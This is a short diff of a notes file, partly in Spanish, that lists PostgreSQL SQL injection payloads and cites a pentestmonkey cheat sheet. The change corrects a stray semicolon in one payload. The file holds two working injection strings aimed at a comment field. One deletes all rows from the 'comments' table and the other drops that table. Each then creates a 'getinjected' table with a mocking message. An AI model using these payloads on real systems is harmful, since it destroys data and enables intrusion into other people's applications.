@@ -9,7 +9,7 @@ ref:
 https://pentestmonkey.net/cheat-sheet/sql-injection/postgres-sql-injection-cheat-sheet
 
 DELETE:
-comentario'); delete from "comments";; CREATE TABLE IF NOT EXISTS getinjected (id SERIAL PRIMARY KEY, mensaje TEXT); INSERT INTO getinjected (mensaje) VALUES ('tabla limpia
+comentario'); delete from "comments"; CREATE TABLE IF NOT EXISTS getinjected (id SERIAL PRIMARY KEY, mensaje TEXT); INSERT INTO getinjected (mensaje) VALUES ('tabla limpia
 
 DROP TABLE: 
 comentario'); DROP TABLE comments; CREATE TABLE IF NOT EXISTS getinjected (id SERIAL PRIMARY KEY, mensaje TEXT); INSERT INTO getinjected (mensaje) VALUES ('tabla dropeada
